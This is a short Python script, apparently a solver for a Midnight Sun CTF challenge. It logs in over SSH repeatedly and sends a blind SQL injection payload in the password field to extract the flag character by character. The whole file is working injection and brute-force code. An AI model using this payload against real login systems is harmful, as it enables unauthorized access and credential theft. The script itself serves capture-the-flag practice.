import pexpect

allowed_chars = "-abcdefghijklmnopqrstuvwxyz0123456789_}"
correct_flag = "midnight{"

while correct_flag[-1] != '}':
    got_new_char = False;
    for test_char in allowed_chars:
        query = "' or (username = 'elliot' and LEFT(password," + str(len(correct_flag)+1) + ") = \"" + correct_flag + test_char + "\" ) --'"
        process = pexpect.spawn("ssh -p2222 elliot@fsociety-03.play.midnightsunctf.se")
        process.expect(".*:")
        process.sendline(query)
        check = process.expect(["Permission denied.*", ".*Who are you?.*"])
        if check == 1:
            # Correct
            print(test_char)
            got_new_char = True
            correct_flag += test_char
            break
        else:
            process.terminate()
    if not got_new_char:
        print("Character not found in allowed_chars")
        break

print("Flag: ", correct_flag)
